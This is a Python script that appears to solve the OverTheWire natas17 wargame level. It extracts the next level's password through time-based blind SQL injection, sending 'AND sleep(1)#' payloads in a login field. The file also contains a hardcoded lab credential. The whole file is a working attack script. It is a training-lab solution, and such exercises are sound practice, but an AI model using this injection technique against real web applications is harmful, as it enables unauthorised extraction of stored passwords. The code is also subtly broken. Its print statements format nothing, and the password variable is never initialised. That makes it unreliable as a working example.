#!/usr/bin/python3

# coding : utf-8


import requests
import string

pass_charset = string.ascii_letters + string.digits
URL = "http://natas17.natas.labs.overthewire.org"

session = requests.Session()
session.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
payload = {'username': ''}
reduced_charset = ""

time_list = []

# determine only characters present in password, to reduce time
for c in pass_charset:
    payload["username"] = 'natas18" AND password LIKE BINARY "%{}%" AND sleep(1)#'.format(c)
    r = session.post(URL, data=payload)
    if r.elapsed.total_seconds() >= 1:
        reduced_charset += c

print("reduced character set : ".format(reduced_charset))

for i in range(1, 32+1):
    for c in reduced_charset:
        payload["username"] = 'natas18" and strcmp(BINARY substr(password, {}, 1), "{}") = 0 and sleep(1)#'.format(i, c)
        res = session.post(URL, data=payload)
        if res.elapsed.total_seconds() >= 1:
            password += c

print("flag is : ".format(password))


#print("guessed char: {}".format(pass_charset[time_list.index(max(time_list))]))

